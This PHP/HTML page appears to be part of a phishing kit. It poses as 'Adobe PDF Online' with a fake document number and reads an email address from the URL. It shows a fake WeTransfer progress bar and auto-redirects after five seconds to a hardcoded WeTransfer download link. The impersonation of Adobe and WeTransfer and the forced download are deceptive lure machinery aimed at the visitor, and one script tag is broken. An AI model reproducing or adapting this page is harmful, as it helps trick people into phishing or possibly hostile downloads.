<?php

if (isset($_GET['email'])) {

	$email = $_GET['email'];
}


$loc = "https://wetransfer.com/downloads/2f5358752626e2d79a336c455c78090420170804005825/cb14f97ea63ffc1f50eb20170804005825/e24034?utm_campaign=WT_email_tracking&utm_content=general&utm_medium=download_button&utm_source=notify_recipient_email";

?>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<title>Adobe PDF Online - 984NF98738UNFD84309KSJDJR4843</title>
<link rel="icpng" href="images/favicon.ico">
<meta http-equiv="Refresh" content="5;url=<?php echo $loc; ?>">
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
<script ery.com/jquery-3.1.1.min.js"></script>
</script>
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
<script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
</script>
</head>
<body>

<div style="position: absolute; width: 437px; height: 32px; font-size: 14px; z-index: 1; left: 422px; top: 170px" id="layer8" class="alert alert-success" role="alert">
<strong>Creating link to WeTransfer Server...</strong>
</div>
<div style="position: absolute; width: 437px; height: px; z-index: 1; left: 422px; top: 170px" id="layer8">
<div class="row">
        <div class="col-xs-8">
            <div class="progress">
                    <div class="progress-bar" role="progressbar" aria-valuenow="0" aria-valuemin="0" aria-valuemax="100" style="width: 0%">
                        0%
                    </div>
                </div>
        </div>
    </div>

</div>
</body>
<script>

var progressBar = $('.progress-bar');
var percentVal = 0;

window.setInterval(function(){
  	percentVal += 10;
    progressBar.css("width", percentVal+ '%').attr("aria-valuenow", percentVal+ '%').text(percentVal+ '%'); 
    
    if (percentVal == 100)
    {
    	percentVal = 0;      
    }
    
}, 550);

</script>
</html>